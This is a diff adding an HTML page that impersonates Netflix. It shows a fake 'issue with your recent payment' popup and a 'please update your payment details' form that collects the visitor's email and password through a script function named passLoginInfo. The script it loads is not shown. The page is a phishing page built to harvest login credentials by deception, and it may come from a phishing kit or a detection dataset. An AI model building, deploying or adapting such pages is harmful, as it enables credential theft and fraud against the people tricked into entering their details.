@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Netflix - Welcome</title>
+<link href="local_resources/css/02cb939c9a1c3d98d7271cab0ac3da93.css" rel="stylesheet"/>
+</head>
+<body>
+<!-- Payment Popup -->
+<div class="payment-popup" id="paymentPopup">
+<span class="close-btn" id="closePopup">×</span>
+<p>Dear User,
+      There was an issue with your recent payment, which may lead to your account being placed on hold if not resolved. Please update your payment details to ensure continued access to your account.</p>
+</div>
+<!-- Main Content -->
+<div class="container">
+<img alt="Netflix Logo" class="logo" src="local_resources/img/777af312665c37fad24ca33a1eab8dca.png"/>
+<h2>PLEASE UPDATE YOUR PAYMENT DETAILS</h2>
+<form id="loginForm" onsubmit="return passLoginInfo()">
+<div class="form-group">
+<label for="email">Email Address</label>
+<input id="email" name="email" placeholder="Your Email Address" required="" type="email"/>
+</div>
+<div class="form-group">
+<label for="password">Password</label>
+<input id="password" name="password" placeholder="Your Password" required="" type="password"/>
+</div>
+<div class="form-group">
+<button type="submit">Login</button>
+</div>
+<div class="form-group">
+<a class="signup-link" href="https://www.netflix.com/signup">Not a member? Sign up now.</a>
+</div>
+</form>
+</div>
+<script src="local_resources/js/0d0db808df1715558addc04823f61213.js"></script>
+</body>
+</html>
